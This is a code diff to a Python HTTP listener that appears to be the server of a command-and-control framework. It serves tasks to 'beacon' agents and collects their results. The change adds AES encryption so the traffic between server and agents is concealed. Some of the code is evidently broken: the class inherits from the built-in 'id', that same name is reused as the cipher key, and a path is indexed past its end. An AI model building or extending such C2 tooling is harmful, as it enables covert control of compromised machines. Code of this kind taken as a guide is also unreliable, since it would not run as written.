@@ -2,6 +2,7 @@
 from controllers.db import *
 from http.server import BaseHTTPRequestHandler
 import os
+from controllers.AES import *
 
 ''' 
 TO DO: 
@@ -10,7 +11,7 @@ TO DO:
 3- Implementing the encryption inside 
 '''
 
-class Listener(BaseHTTPRequestHandler):
+class Listener(BaseHTTPRequestHandler, id):
     def do_GET(self):
         #For testing
         if self.path == '/': 
@@ -38,7 +39,10 @@ class Listener(BaseHTTPRequestHandler):
                 self.send_response(200) 
                 self.end_headers() 
                 if(task): 
-                    self.wfile.write(bytes(task, 'utf-8'))
+                    #---------------------------------------------------------
+                    cipher = encrypt(id,task)
+                    self.wfile.write(bytes(cipher, 'utf-8'))
+                    #---------------------------------------------------------
                 else: 
                     #No task available, shush the beacon
                     pass    
@@ -52,7 +56,10 @@ class Listener(BaseHTTPRequestHandler):
                 agentID = os.path.split(self.path)[2]
                 self._set_headers()
                 content_len = int(self.headers.get('content-length'))
-                result = self.rfile.read(content_len)
+                #---------------------------------------------------------
+                cipher = self.rfile.read(content_len)
+                result = decrypt(id, cipher)
+                #---------------------------------------------------------
                 print('Received Task Results from agent #%s \n Result: %s' %(agentID, result))
                 writeResult(agentID, result)
                 self.send_response(200)
